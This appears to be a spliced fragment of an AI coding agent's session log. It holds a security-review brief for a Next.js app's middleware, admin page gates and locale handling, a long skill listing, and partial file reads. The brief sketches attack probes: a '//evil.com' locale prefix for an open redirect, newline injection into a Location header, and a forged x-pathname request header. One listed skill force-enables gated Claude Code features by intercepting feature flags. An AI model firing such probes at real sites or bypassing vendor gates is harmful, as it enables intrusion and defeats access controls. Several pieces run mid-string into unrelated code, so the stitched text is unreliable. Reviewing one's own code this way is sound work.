No network calls to production APIs. Never authenticate with or echo any secret from .env files. Scope is `nextjs/` and `hyperwhisper-cloud/` TypeScript only.\n\n## Your trace unit: T11 — the Next.js request gate, the admin page gates, and the locale/header plumbing\n\n- **EP-31** `nextjs/middleware.ts:73` default middleware + matcher :152-160. Inputs: `request.nextUrl.pathname` (regex-matched against a locale list :12-18), cookies `better-auth.session_token` / `__Secure-better-auth.session_token` (**presence only**, `hasSessionCookie:33`), `searchParams.returnTo` (sanitized via `sanitizeReturnTo`, `nextjs/src/lib/license-key-redirect.ts:9`), and the full `cookie` header forwarded to an INTERNAL fetch `${origin}/api/auth/get-session` (:52-56). Sets a response header `x-pathname` (:108,:127,:141,:147). Gates `/[locale]/user/*` on cookie presence only (:118); a real session+role check happens **only** for `/user/customers` (:87-104) via `USER_CUSTOMERS_REGEX` (:18).\n- **EP-51** `nextjs/app/[locale]/user/(authenticated)/devices/page.tsx:20` — the **sole** admin gate for `/user/devices` (`session.user.role !== \"admin\"` → redirect :32), since middleware has no regex for it.\n- **EP-52** `nextjs/app/[locale]/user/(authenticated)/customers/page.tsx:23` — double-gated (middleware + page).\n- **EP-53** `nextjs/app/[locale]/user/(authenticated)/layout.tsx:25` — session check for the whole authenticated subtree.\n- **EP-54** `nextjs/app/[locale]/user/(authenticated)/dashboard/page.tsx:22`.\n- **EP-33** `nextjs/app/[locale]/user/auth/sign-out/route.ts:9` `POST` — the inventory claims **the handler never returns**: a redirect is built at :21, mutated at :27/:31, and the function ends at :35 with no `return`. It is explicitly excluded from the middleware session gate (`middleware.ts:79,113-117`). VERIFY this by reading the file, and work out what Next.js actually does when a Route Handler resolves `undefined`, and what the user experiences (is the session cleared? is the cookie delivered?).\n- **EP-32** `nextjs/app/[locale]/layout.tsx:48` `generateMetadata` — reads `headers().get(\"x-pathname\")` (:54) **from the REQUEST**, while middleware only ever sets `x-pathname` as a RESPONSE header and never via `NextResponse.next({request:{headers}})`. Feeds `stripLocalePrefix` (`nextjs/src/i18n/locales.ts:107`) → `buildAlternateLanguageMap` (:120, no encoding, 40 URLs) → `canonical` (:84), `openGraph.url` (:93), `data-locale` (:177). `params.locale` here is unvalidated.\n- **EP-78** `nextjs/app/layout.tsx:11` — `headers().get(\"x-next-intl-locale\")` (:12) rendered into `<html lang={locale}>` (:15); also injects an unpinned remote script `https://www.agentstack.build/embed.js` (:21-25, no SRI).\n- **EP-85** `nextjs/i18n.ts:8` and **EP-86** `nextjs/src/i18n/request.ts:5` — TWO competing `getRequestConfig` definitions. EP-85 rejects unknown locales with `notFound()` (:10); EP-86 silently falls back to the default (:9-11, using `as any`). Determine which one is actually wired (check `next.config`, the next-intl plugin config, and imports) — this decides whether EP-32's unvalidated `params.locale` is reachable at all.\n- **EP-88** `nextjs/app/[locale]/layout.tsx:4-15` — module side effect overwriting `global.localStorage` with a stub on the server.\n- **C10 / EP-79** — `params.locale` interpolated unvalidated into `redirect()` in `nextjs/app/[locale]/user/page.tsx:14`, `manage-billing/page.tsx:9`, `customer/page.tsx:9`, `customer/dashboard/page.tsx:9`, `customer/sign-in/page.tsx:9`, plus EP-57 `checkout/page.tsx:29`.\n- Also read `nextjs/src/i18n/routing.ts`, `navigation.ts`, `locales.ts`, `nextjs/app/[locale]/error.tsx`, `nextjs/app/not-found.tsx`.\n\n## What to walk\n\nAt EVERY hop ask exactly one question: **\"What does this layer ASSUME that the layer above does not GUARANTEE?\"**\n\nFocus especially on:\n- **The cookie-presence gate**: middleware admits any request bearing a cookie NAMED `better-auth.session_token`, without verifying its signature. Establish exactly what that buys an attacker given that the pages themselves re-check the session — i.e. is this defence-in-depth theatre or a real bypass? Enumerate every route under the matcher whose ONLY gate is middleware, if any.\n- **`/user/devices` single point of failure**: EP-51's page-level `role !== \"admin\"` check is the only admin gate. Read `DevicesClient.tsx` and confirm whether the tRPC procedures it calls (`admin.devices.*`) independently enforce admin — if they do, the page gate is redundant; if they do NOT, then any route that renders the client, or a direct tRPC call, bypasses it. Check `nextjs/server/api/trpc.ts` `adminProcedure`.\n- **The `x-pathname` seam** (EP-32): this is the highest-value item in your unit. Confirm from the middleware source that `x-pathname` is set on the RESPONSE only. Then confirm from `layout.tsx:54` that it is READ from the request headers. Determine the two consequences precisely: (a) for ordinary traffic the value is absent, so what do `canonical` and the 40 hreflang URLs collapse to; (b) for a request that sets `x-pathname:` itself, what do they become — and is the value HTML-escaped by React in a `<link rel=canonical href>` context, or does it only pollute SEO metadata? Be precise about which of these is a real bug versus a cosmetic one, and check whether Vercel strips client-supplied `x-pathname`.\n- **The sign-out non-return** (EP-33): construct the exact user-visible outcome. Does `auth.api.signOut` still revoke the DB session (so the user IS logged out server-side) while the browser keeps a cookie and sees a 500? That divergence is the seam.\n- **Two `getRequestConfig`s** (EP-85 vs EP-86): determine which is live. If the silently-falling-back one is live, then `/xx/anything` renders with default messages and `locale = \"xx\"` flows into every `redirect()` in C10 and into `canonical`. Construct what a crafted locale segment yields — in particular whether `redirect(\\`/${locale}/...\\`)` with a locale containing `..`, a newline (header injection into the `Location` response header), or a `//evil.com` prefix produces an open redirect or response splitting. Test the newline case carefully: does Next reject invalid header values?\n- **The internal `get-session` fetch in middleware** (:52-56): a full request-forwarding round trip per `/user/customers` request. What happens if it fails or times out — fail open or closed? Does it forward the ORIGINAL host header (SSRF-ish / wrong-origin) and could the response be cached?\n- **`global.localStorage` stub** (EP-88): a process-global mutation on a shared server. Determine which libraries read `localStorage` on the server and whether one request's write is visible to another request (cross-request state leakage).\n\nHunt for: validation gaps reachable via a second path; tightened assumptions with unaware call sites; ordering/timing; partial failure; concurrency / cross-request global state; boundary mismatches (encoding, header injection, URL parsing) and ERROR CONTRACTS.\n\n## Return format\n\nFor each candidate bug return: `trace` (hops with file:line), `seam` (which hop pair breaks, naming both), `trigger_sketch` (the literal request/URL/header), `consequence` (user-visible failure), `confidence` (low/medium/high).\nAlso return `depth_limits` and `files_opened`.\n\nDo NOT self-censor medium/low-confidence candidates. Do NOT report style issues or hypotheticals with no nameable trigger. Do not write files; return everything in your final message. {"parentUuid":"d1ffd045-5bd7-471d-a2ef-9705f6c33e38","isSidechain":true,"agentId":"aaacbbc79f49a8837","attachment":{"type":"skill_listing","content":"- artifact-planner: Produce a self-contained, navigable HTML artifact that visualizes a multi-stage flow or feature plan as a SPLIT STORYBOARD: each scene pairs a rich UI/mockup (left) with a before→after Mermaid diagram of the structural change (right), plus a \"what this lets you do\" line and an \"under the hood\" strip. Embeds a machine-readable plan spec so a brand-new session can re-import the artifact and keep iterating. Works for ANY project — discover the target repo's stack/URLs/conventions at runtime rather than assuming them. Use whenever the user wants to plan, mock up, walk through, or visualize any multi-step flow: onboarding, checkout, auth, OAuth integrations, wizards, subscription cancellation, push notifications, support ticket lifecycles, AI chat execution, CI/CD pipelines, refund flows, admin features, migrations, webhook lifecycles, or anything else with sequenced stages and decision points. Trigger on \"create an artifact for…\", \"plan this flow\", \"make a flow plan\", \"visualize this flow\", \"show me the stages of…\", \"mock up the flow for…\", \"I want to plan X visually\", \"build a walkthrough of…\", or any time the user has just described a feature/flow and would benefit from a single-page visual + structured spec they can revisit, share, or drop back into a new chat. Each artifact is one HTML file at `/tmp/<slug>.html`, opens in Chrome, and embeds its own plan JSON.\n- artifact-planner-canvas: Produce a self-contained HTML artifact that visualizes a multi-stage flow or feature plan as a SPATIAL CANVAS: the WHOLE plan on one pannable/zoomable Figma-style board — frontend mockups in a top band, each stage's before→after Mermaid diagram directly beneath (dashed spine connectors), branches as tinted lanes with fork/rejoin curves, decisions and open questions as sticky notes placed next to the stages they affect, and double-click-anywhere comment stickies. This is the CANVAS variant of `artifact-planner` (which pages one scene at a time as a split storyboard): prefer the canvas when the user wants to see everything at once, compare stages spatially, or leave free-floating comments; prefer the paged storyboard for linear walkthroughs and presentations. Embeds the same machine-readable plan spec so a brand-new session can re-import the artifact and keep iterating. Works for ANY project — discover the target repo's stack/URLs/conventions at runtime rather than assuming them. Use whenever the user wants to plan, mock up, or visualize any multi-step flow (onboarding, checkout, auth, wizards, CI/CD pipelines, migrations, webhook lifecycles…) AND signals a canvas: \"canvas artifact\", \"spatial plan\", \"put the plan on a canvas/board\", \"Figma-style board\", \"show me the whole flow at once\", \"map it out spatially\" — or when they ask for the canvas version of an existing artifact-plan. Each artifact is one HTML file at `/tmp/<slug>.html`, opens in Chrome, and embeds its own plan JSON.\n- auto-rough-cut: Turn a folder of raw class-video recordings — separately recorded pristine voice tracks (Audacity .wav) plus their screen/camera videos (.mp4) — into a draggable Adobe Premiere Pro FCP7 XML that is silence-cut to Ray's Recut preferences, has the pristine audio synced and linked to the video, transcribes every kept chunk, and flags repeated takes / filler / breaths in PURPLE for a fast review pass. Use this skill whenever Ray points at a folder of recording pairs and wants a rough cut, first assembly, or \"silence cut\", or says things like \"cut the silences\", \"sync my audio and video and remove the dead air\", \"make a Premiere XML from these recordings\", \"apply my Recut process / record preferences\", \"flag the retakes\", \"auto rough-cut this video\", \"turn my Audacity audio + screen recording into a timeline\", or stages new recordings under a \"[Class Videos]\" / to-film folder. Trigger it even if Recut, transcription, or retakes aren't all named — any \"remove the silence and give me a Premiere XML I can still drag around\" request for paired audio+video is this skill. Distinct from recut-xml-fixer (which only repairs an XML Recut already exported); this skill does the whole cut from raw media.\n- auto-spec: Turn a feature brief (inline text or a stub plan file) into an implementation-ready plan via an autonomous two-agent interview, an external-API research verification pass, and a two-agent codebase-grounded planning pass — and, in its bootstrap mode, build/refresh the personalized digital twin that powers that interview by mining your Claude Code conversation history. Use when the user says \"auto spec\", \"spec autopilot\", \"auto interview\", \"flesh out this plan\", \"/auto-spec <file or brief>\", or otherwise wants a plan written without manually answering questions; ALSO use for \"create my auto-spec\", \"clone my brain\", \"make a spec twin\", \"personalize auto-spec\", \"build my decision profile\", or any request to analyze conversation history for decision patterns. Produces a single plan file with Feature Brief, Spec Decisions, External Research, Codebase Map, and phased Implementation Plan — ready to hand to `/implement-task` — or, in bootstrap mode, a refreshed `decision_profile.md` + `qa_examples.json` digital twin.\n- chronicle\n- codex-consult: OpenAI Codex CLI wrapper — three modes. Code review: independent diff review via\ncodex review with pass/fail gate. Challenge: adversarial mode that tries to break\nyour code. Consult: ask codex anything with session continuity for follow-ups.\nThe \"200 IQ autistic developer\" second opinion. Use when asked to \"codex review\",\n\"codex challenge\", \"ask codex\", \"second opinion\", or \"consult codex\".\n- improve-claude-md: improve a CLAUDE.md file using <important if> blocks to improve instruction adherence\n- interview: Relentlessly interrogate a plan, decision, or idea one question at a time until the user and Claude reach a genuinely shared understanding. Use this whenever the user wants to stress-test their thinking, pressure-test a plan, be challenged on an idea, or says any of \"interview me\", \"grill me\", \"grill this\", \"poke holes in this\", \"stress-test this\", \"ask me everything\", \"interrogate me\", \"what am I missing\", or \"/interview\". Also reach for it when the user drops a half-formed plan and asks for questions before you build anything, or when a request is underspecified enough that guessing would waste real work. Do not write code, files, or plans while this skill is active until the user says the picture is complete.\n- slackbot-message: Send Slack messages to a named channel via a bot user. Use this skill whenever you need to notify Ray on Slack, post a status update, alert a channel, deliver a short summary, or when he asks you to \"post to slack\", \"message #channel\", \"send a slack message\", \"ping slack\", \"slack me\", \"let me know on slack\", or names a specific Slack channel by name. Also use it after long-running tasks finish if Ray asked for Slack notifications. The bot is invited to the relevant channels, so the script can post to any channel by its human-readable name (no need to know channel IDs).\n- spec-developer-v2: Interview the user about a rough idea or brief with sharp, non-obvious product and technical questions, then write a concise implementation-ready spec. Use when the user wants to spec something out, develop a vague idea into requirements, or turn a product concept into a detailed plan.\n- sync-skills: Commit and push GLOBAL skill changes to the personal skills git repo\n(github.com/ray-amjad/private-skills). Auto-detects what changed in\n~/.claude/skills/, stages the changes, generates a meaningful commit message,\nand pushes to origin main. Use this skill whenever you finish creating or\nediting a global skill, or when the user says \"sync skills\", \"push skills\",\n\"save skills\", \"/sync-skills\", or asks to commit skill changes to git.\nIMPORTANT: Only trigger this skill when working at the project level (i.e., when\nthe working directory is a project repo, not from within ~/.claude/skills/ itself).\nDo NOT use this for project-scoped skills (e.g. skills under a project's own\n.claude/skills/, like ray-os's sentence-mining) — those are committed to that\nproject's repo, not here.\n- ultragoal\n- vercel-logs: Check Vercel production logs, errors, and build output. Use this skill whenever you need to\ndiagnose a deployment error, check for runtime errors, investigate 500s, or the user asks\n\"check the logs\", \"what's the error\", \"why is it broken\", \"check vercel logs\", or any\nrequest to look at Vercel deployment/runtime/build logs. Also trigger on `/vercel-logs`.\n\nCRITICAL: Also invoke this skill BEFORE running any `vercel logs` command yourself —\neven when no one asked you to. The CLI has non-obvious flag interactions (implicit\nfollow mode, stderr-only output, --since rejection) that cause hangs or silent failures\nif you guess at flags. If you're about to type `vercel logs` in a Bash call, load this\nskill first.\n- vercel-monitor: Watch a Vercel deployment in the background and notify when it reaches Ready/Error/Canceled.\nUse this skill whenever the user pushes to main, runs `git push`, deploys to Vercel, or asks\nto \"monitor the deploy\", \"watch the build\", \"check if it deployed\", or anything similar —\neven if they don't explicitly say \"Vercel\". Also trigger on `/vercel-monitor`. This replaces\nolder patterns of spawning a haiku subagent or polling via the Vercel MCP, both of which\nwaste tokens and context on large projects.\n- anki-cleanup\n- binary-explorer: Reverse-engineer any desktop application OR Claude Code's own binary to understand how it works behind the scenes — the APIs it calls, the internal flow, the models/providers it uses, its feature flags, config constants, embedded prompts, IPC protocols. For general apps it works on Electron apps (Wispr Flow, Slack, Discord, VS Code, Cursor, Notion, Linear…), native macOS .app bundles, single-executable bundles (Bun/Node/Deno/Go SEA), and raw Mach-O / ELF / PE binaries. It ALSO reverse-engineers Claude Code's own binary — it knows Claude Code's mangled variable conventions, feature-flag patterns, and embedded-prompt layout. Use this skill whenever the user points at a desktop app and wants to know \"how does X work under the hood\", \"what API does it call\", \"how does it do Y\", \"what's the flow for Z\", \"reverse engineer this app\", \"figure out how this feature works\", \"what endpoints does it hit\", \"does it run locally or in the cloud\", \"what model does it use\", or names a specific app path (.app, .exe, a binary). ALSO use it whenever the user asks about a Claude Code feature, feature flag, hidden toggle, internal prompt, or wants to understand how something in Claude Code works under the hood — especially unreleased, gated, or undocumented functionality — or says \"how does X work in the binary\", \"what does this feature flag do\", \"find the prompt for X\", \"reverse engineer X\", or mentions a specific codename/flag. Also trigger when the user wants to audit an app's network behavior, understand its architecture, or ext…\n- class-scriptwriter: Turn a raw idea, source tweet, video transcript, feature announcement, or rough outline into a polished video script for Ray's Agentic Coding School classes. Use this skill whenever the user says \"write a class script\", \"turn this into a class video\", \"script this for the [business/claude-code/prompt-engineering/skills/context-engineering/techniques/claude-chat/claude-cowork/correction] class\", \"draft an agentic coding school video\", or whenever the user is staging content in `/Users/ray/Desktop/ray-os/projects/agentic-coding-school/to-film/` and wants it written up. Default to this skill for any new file destined for the `to-film/` tree, even if the user does not name it explicitly. Produces an essay-style markdown script with the correct frontmatter, horizontal rules between sections, inline image embed placeholders, and a Demo section, written in Ray's direct second-person voice.\n- content-cascade\n- discord-archive\n- excalidraw-bundle: Bundle a set of section images into a single .excalidraw file laid out as a grid — one column per section in document order, the section's variations stacked vertically — and save it to ~/Downloads, ready to drag into excalidraw.com or the Obsidian Excalidraw plugin.\n- excalidraw-codex: Generate excalidraw-style explanation images using the Codex CLI (codex exec --json) instead of a paid API. Use when the user wants visual explanations, diagrams, or illustrations in the hand-drawn excalidraw aesthetic and asks for the codex path. Codex's bundled image_gen tool runs through the logged-in account, so no GEMINI_API_KEY is required and it's often faster than the Gemini route. Triggers on \"generate an excalidraw image\", \"excalidraw-codex\", \"use codex for excalidraw\", or any request for excalidraw-style diagrams where no engine is named. This is the RECOMMENDED DEFAULT path for excalidraw image generation: it needs no API key and runs through the logged-in Codex account. Sibling skill [[excalidraw-gemini]] does the same job through the paid Gemini API. Default to codex whenever the user does not explicitly ask for the Gemini route.\n- excalidraw-codex-simple\n- excalidraw-deck: Build hand-drawn, Excalidraw-style HTML slide decks that explain a concept through sketch-aesthetic vector diagrams — rough.js strokes on a dark canvas, full-bleed, one diagram per slide with a caption underneath, arrow-key and tap navigation. Use this skill whenever the user wants explainer slides, a concept deck, diagram slides, or a talk/video presentation in the hand-drawn sketch look, or says things like \"make slides for X\", \"build a deck for X\", \"add a slide in this style\", \"turn this into a sketch/excalidraw-style deck\", \"another slide like the workflow deck\", or points at an existing rough.js deck and wants more in the same style. This is for self-contained vector-diagram decks — NOT the Claude Code terminal-aesthetic slides (use cc-terminal-slides) and NOT raster image generation (use excalidraw-gen, which calls an image model). Reach for this skill proactively for any \"explain this concept on slides\" request, even when the user does not say the word \"excalidraw\".\n- extract-wisdom: Extract structured wisdom, insights, and actionable takeaways from any content — podcasts, articles, videos, transcripts, books, or conversations. Use this skill whenever the user asks to \"extract wisdom\", \"summarize insights\", \"pull out key ideas\", \"what are the takeaways\", \"extract the best parts\", \"distill this content\", \"what did I learn from this\", or provides a transcript/article and asks for a structured breakdown. Also trigger when the user pastes or references long-form content and wants the signal extracted from the noise — even if they don't use the word \"wisdom\" specifically. Inspired by Daniel Miessler's Fabric pattern. Has a BATCH MODE for running this extraction across a whole YouTube channel in bulk: lists videos with yt-dlp, filters by duration, downloads transcripts, then fans out one extract-wisdom subagent per video in batches of 5, writing one wisdom file per video to disk. Trigger batch mode whenever the user wants wisdom/insights/takeaways from a YouTube channel in bulk: \"extract wisdom from this channel\", \"go through @<handle>'s long videos\", \"summarise everything on <channel>\", \"give me the best ideas from <creator>'s podcast\", \"process a whole channel into wisdom notes\", or \"I want to read the highlights from every video on @<handle> longer than 20 minutes\".\n- humanizer\n- idea-foundry\n- image-cleanup: Clean up unreferenced images in Obsidian vault folders. Deletes unused images, renames excalidraw files with descriptive names based on image content (using vision), and moves everything to vault root images/ folder. Use after picking favorites from excalidraw-gen batches. Triggers on \"clean up images\", \"delete unused images\", \"tidy up images\", \"image cleanup\", or \"/image-cleanup\".\n- linkedin: All LinkedIn tasks — writing posts (text or carousel), scouting sources to post about, checking post performance, browsing the feed, or analyzing competitors. Triggers on any mention of LinkedIn, including \"write a LinkedIn post\", \"make a LinkedIn carousel\", \"swipeable LinkedIn post\", \"LinkedIn slides\", \"check my LinkedIn\", \"how did my posts do\", \"LinkedIn competitors\", \"post on LinkedIn\", \"browse LinkedIn feed\". Also triggers on \"check post engagement\", \"update post metrics\", or reviewing social media performance. Also use it for finding something to post about — \"find me a LinkedIn topic\", \"run a source sweep\", \"scout me something on MCP\", \"what should I post today\", or reviewing the drafts the daily scout left in Slack\n- newsletter-writer: Write personal newsletters in a conversational, essay-style format inspired by Ali Abdaal's style. Use when the user wants to write a newsletter issue, draft an email to their list, write a LifeNotes-style essay, or asks for help with newsletter writing. Triggers on requests like \"write a newsletter\", \"draft a newsletter about...\", \"help me write my weekly email\", \"newsletter style\", or when the user provides a topic and wants it turned into a newsletter format.\n- rakuten-hotels\n- recut-xml-fixer: Reshape an FCP7 XML exported from a silence-cutting app (Recut, AutoEdit, Vika, etc.) so Adobe Premiere Pro imports it cleanly with the user's pristine external audio (e.g. Audio.wav from Audacity) linked to the video instead of the camera/screen-recording's own audio. Use this skill whenever the user points at an .xml or sequence file from Recut, AutoEdit, or any auto-cutter and wants to swap in their own audio track, drop the redundant on-camera audio, fix vertical alignment between video and audio cuts, or fix a Premiere \"import failed\" error on a Recut-style XML. Triggers on phrases like \"fix this Recut XML\", \"swap the audio in this premiere XML\", \"align the cuts to my Audio.wav\", \"remove the loom audio track\", \"merge V1 and A1 in this XML so they're linked\", or any reference to a workflow combining a silence-cutter app's XML with a separately recorded pristine audio file.\n- sentence-mining: Build and maintain Japanese sentence-mining cards for Anki, fully self-contained (no AnkiMorphs install required) and configurable per user via a one-time `/sentence-mining setup`. Six modes, and the skill ASKS which one you want on every launch. (1) Video mode — paste any Instagram reel, YouTube video/Short, TikTok, Twitter video, or local file → yt-dlp + AssemblyAI + SudachiPy + a built-in i+1 known-word diff produces draft cards. (2) Bank mode — give a list of target words → find the best example sentence for each through one canonical cascade (Immersion Kit → Nadeshiko → sentencesearch → kotu → your locally-indexed subs2srs .apkg banks), re-ranked by your own i+1, with native audio and a screenshot where the source ships one. (3) Replace mode — fix existing cards whose example sentence is bad (too short, a fragment, incomprehensible): pull a better sentence through the same cascade, edit the card in place (archiving the old sentence to a previous_versions field), and rehabilitate the card so you re-learn it fresh. (4) Leech mode — work the cards Anki flagged as leeches, but filtered by whether they are STILL failing: `tag:leech` is a scar Anki never removes, so most of a leech list is usually cards that recovered months ago (43 of Ray's 78 sat at 21-338 day intervals). Cards below the interval threshold get a fresh sentence through the cascade plus full rehabilitation (reps/lapses zeroed, due today); recovered cards just have the tag stripped with their scheduling untouched; words rarer than a JPDB frequen…\n- transcribe-youtube-video: Transcribe audio or video into a clean .txt + timestamped .srt + YouTube chapter timestamps. Re-encodes any WAV/MP4 to a small MP3 before upload, mines on-screen text with OCR to seed AssemblyAI key terms, runs AssemblyAI Universal-3 Pro speech-to-text, then generates punchy chapter markers from the SRT. Use whenever the user wants to transcribe a video or audio file, generate subtitles/captions or an SRT, create a YouTube transcript or chapters, or convert a recording to text. Also trigger when the user has a WAV/MP4/MOV and wants text out of it, even without saying 'transcribe'.\n- ungate-claude-code-feature: Enable a gated, experimental, or staged-rollout Claude Code feature on your own machine by finding its GrowthBook feature flag in the binary and force-enabling it through a Proxyman interception rule (with an optional disk-cache fast-path). Use this skill whenever the user wants to ungate, unlock, force-enable, or \"turn on\" a Claude Code feature hidden behind a flag — phrasings like \"ungate the X feature\", \"enable ultrareview\", \"unlock [feature name]\", \"turn on [feature]\", \"enable the workflow/agent tool\", \"this feature won't show up even with the env var\", \"force-enable a tengu_ flag\", \"flip the flag for X\", \"intercept the feature flag\", \"unlock a beta Claude Code feature\", or any case where a Claude Code feature is gated and the user wants it on. Also trigger when the user references a specific tengu_ flag name, or the existing \"GrowthBook Flag Enabler\" Proxyman rule, or wants to add another flag to it. For the user's own Claude Code install and account.\n- watch-next-jp\n- wisdom-to-acs-gap: Turn ONE video (YouTube URL/id or a pasted transcript) into an Agentic Coding School (ACS) content-gap report: extract its full wisdom, promote the 1-3 load-bearing \"spine\" ideas, deep-dive each in prose, gap-check each against the live ACS catalog, and pitch the buildable new ACS videos. The analysis engine behind the acs/gap-scout routine, but also runs standalone. Use this skill WHENEVER the user pastes or links a coding/AI video (podcast, talk, tutorial, feature walkthrough) and wants the ACS angle: \"what ACS video could come from this\", \"run the gap scout on this\", \"gap-check this against the catalog\", \"find the spine idea\", \"is this already covered in the school\", \"what should I film from this\", \"mine this video for ACS\", or just drops a transcript/link and asks what's video-worthy. Use whenever the user wants to brainstorm titles, generate thumbnails (text or images), record A/B test results, analyze title/thumbnail performance, or asks things like \"suggest titles\", \"what titles should I test\", \"make a thumbnail\", \"thumbnail variations\", \"5 thumbnails for this video\", \"Matt style\", \"Nate style\", \"record these results\", \"what's working\", or \"update the A/B test results\". Also trigger when the user shares a screenshot of YouTube A/B test results and wants analysis or recording. Use when the user asks to \"create a diagram\", \"visualize the flow\", \"draw a sequence diagram\", \"show me how X works\", or needs visual documentation of system interactions, workflows, database schemas, or technical processes.\n- frontend-design:frontend-design: Guidance for distinctive, intentional visual design when building new UI or reshaping an existing one. Helps with aesthetic direction, typography, and making choices that don't read as templated defaults.\n- claude-md-management:claude-md-improver\n- dataviz: Use this skill whenever you are about to create ANY chart, graph, plot, dashboard, or data visualization, in ANY output medium — an HTML or React artifact, inline SVG, plotting code in any library (matplotlib, plotly, d3, Recharts, …), an image/PNG you will render and upload, or a chart shared into Slack. Read it BEFORE writing the first line of chart code, choosing chart colors, building a stat tile / meter / KPI row, or laying out a dashboard. Produces visualizations that read as one system — elegant, accessible, consistent in light and dark — using a brand-neutral placeholder palette you swap for your own. Teaches a design-system-agnostic method: a form heuristic, a color formula with a runnable validator, mark specs, and interaction rules. A validated default palette is documented in `references/palette.md` — swap that file's values for your brand's. Triggers on: \"chart\", \"graph\", \"plot\", \"data viz\", \"visualization\", \"dashboard\", \"analytics\", \"visualize data\", \"categorical colors\", \"sequential / diverging palette\", \"stat tile\", \"sparkline\", \"heatmap\", \"legend\", \"axis\", \"tooltip\", \"chart colors\", \"color by series\".\n- update-config: Use this skill to configure the Claude Code harness via settings.json. Automated behaviors (\"from now on when X\", \"each time X\", \"whenever X\", \"before/after X\") require hooks configured in settings.json - the harness executes these, not Claude, so memory/preferences cannot fulfill them. Also use for: permissions (\"allow X\", \"add permission\", \"move permission to\"), env vars (\"set X=Y\"), hook troubleshooting, or any changes to settings.json/settings.local.json files. Examples: \"allow npm commands\", \"add bq permission to global settings\", \"move permission to user settings\", \"set DEBUG=true\", \"when claude stops show X\". For simple settings like theme/model, suggest the /config command.\n- keybindings-help: Use when the user wants to customize keyboard shortcuts, rebind keys, add chord bindings, or modify ~/.claude/keybindings.json. Examples: \"rebind ctrl+s\", \"add a chord shortcut\", \"change the submit key\", \"customize keybindings\".\n- simplify: Review the changed code for reuse, simplification, efficiency, and altitude cleanups, then apply the fixes. Quality only — it does not hunt for bugs; use /code-review for that.\n- fewer-permission-prompts: Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project .claude/settings.json to reduce permission prompts.\n- loop: Run a prompt or slash command on a recurring interval (e.g. /loop 5m /foo). Omit the interval to let the model self-pace. - When the user wants to set up a recurring task, poll for status, or run something repeatedly on an interval (e.g. \"check the deploy every 5 minutes\", \"keep running /babysit-prs\"). Do NOT invoke for one-off tasks.\n- schedule: Create, update, list, or run scheduled cloud agents (routines) that execute on a cron schedule. - When the user wants to schedule a recurring cloud agent, set up automated tasks, create a cron job for Claude Code, or manage their scheduled agents/routines. Also use when the user wants a one-time scheduled run (\"run this once at 3pm\", \"remind me to check X tomorrow\").\n- claude-api: Reference for the Claude API / Anthropic SDK — model ids, pricing, params, streaming, tool use, MCP, agents, caching, token counting, model migration.\nTRIGGER — read BEFORE opening the target file; don't skip because it \"looks like a one-liner\" — whenever: the prompt names Claude/Anthropic in any form (Claude, Anthropic, Fable, Opus, Sonnet, Haiku, `anthropic`, `@anthropic-ai`, `claude-*`, `us.anthropic.*`, `[1m]`); the user asks about an LLM (pricing/model choice/limits/caching) — never answer from memory; OR the task is LLM-shaped with provider unstated (agent/MCP/tool-definition/multi-agent/RAG/LLM-judge/computer-use; generate/summarize/extract/classify/rewrite/converse over NL; debugging refusals/cutoffs/streaming/tool-calls/tokens).\nSKIP only when another provider is being worked on (overrides all triggers): OpenAI/GPT/Gemini/Llama/Mistral/Cohere/Ollama named in the query; OR `grep -rE 'openai|langchain_openai|google.generativeai|genai|mistralai|cohere|ollama'` over the project hits (run this grep FIRST if no provider named — don't Read the file).\n- claude-in-chrome: Automates your Chrome browser to interact with web pages - clicking elements, filling forms, capturing screenshots, reading console logs, and navigating sites. Opens pages in new tabs within your existing Chrome session. Requires site-level permissions before executing (configured in the extension). - When the user wants to interact with web pages, automate browser tasks, capture screenshots, read console logs, or perform any browser-based actions. Always invoke BEFORE attempting to use any mcp__claude-in-chrome__* tools.\n- run: Launch and drive this project's app to see a change working. Use when asked to run, start, or screenshot the app, or to confirm a change works in the real app (not just tests). First looks for a project skill that already covers launching the app; otherwise falls back to built-in patterns per project type (CLI, server, TUI, Electron, browser-driven, library).\n- init\n- review: Review a GitHub pull request; request.cookies.get(\"better-auth.session_token\");\n  if (!sessionCookie?.value) return null;\n\n  try {\n    const baseUrl = request.nextUrl.origin;\n    const response = await fetch(`${baseUrl}/api/auth/get-session`, {\n      headers: {\n        cookie: request.headers.get(\"cookie\") || \"\",\n      },\n    });\n\n    if (!response.ok) return null;\n\n    const data = Server-side authentication check\n16\t * - Admin detection via email allowlist\n17\t * - Conditional sidebar (only for admins)\n18\t * - Header with user info and sign-out\n19\t * - UserProvider context for child components\n20\t *\n21\t * Layout Variations:\n22\t * - Admins: Full-width with sidebar on left\n23\t * - Regular users: Centered content with max-width (like customer portal)\n24\t */\n25\texport default async function UserLayout({\n26\t  children,\n27\t  params,\n28\t}: {\n29\t  children: React.ReactNode;\n30\t  params: Promise<{ locale: string }>;\n31\t}) {\n32\t  const { locale } = await params;\n33\t  const session = await auth.api.getSession({ headers: await headers() });\n34\t\n35\t  // Double-check auth (middleware should handle this, but be safe)\n36\t  if (!session?.user) {\n37\t    redirect(`/${locale}/user/sign-in`);\n38\t  }\n39\t\n40\t  const user = session.user;\n41\t\n42\t  const isAdmin = user.role === \"admin\";\n43\t\n44\t  return (\n45\t    <UserProvider email={user.email || \"\"} isAdmin={isAdmin}>\n46\t      <div className=\"min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900\">\n47\t        <div className=\"flex\">\n48\t          {/* Sidebar - Only visible for admins */}\n49\t          {isAdmin && <UserSidebar locale={locale} />}\n50\t\n51\t          {/* Main Content */}\n52\t          <div className=\"flex-1 flex flex-col min-h-screen\">\n53\t            <UserHeader user={user} locale={locale} isAdmin={isAdmin} />\n54\t            <main\n55\t              className={`flex-1 ${\n56\t                isAdmin ? \"p-6\" : \"w-full max-w-4xl mx-auto px-6 py-8\"\n57\t              }`}\n58\t            >\n59\t              {children}\n60\t            </main>\n61\t          </div>\n62\t        </div>\n63\t      </div>\n64\t    </UserProvider>\n65\t  );\n66\t}\n67\t"}]},"uuid":"2c4b27c6-ec11-44ca-a032-0c2c10385764","timestamp":"2026-07-29T11:42:49.719Z","toolUseResult":{"type":"text","file":{"filePath":"/Users/ray/Desktop/hyperwhisper-public/nextjs/app/[locale]/user/(authenticated)/layout.tsx","content":"import { redirect } from \"next/navigation\";\nimport { headers } from \"next/headers\";\n\nimport { auth } from \"@/src/lib/auth\";\nimport { UserProvider } from \"@/components/user/UserContext\";\nimport UserSidebar from \"@/components/user/UserSidebar\";\nimport UserHeader from 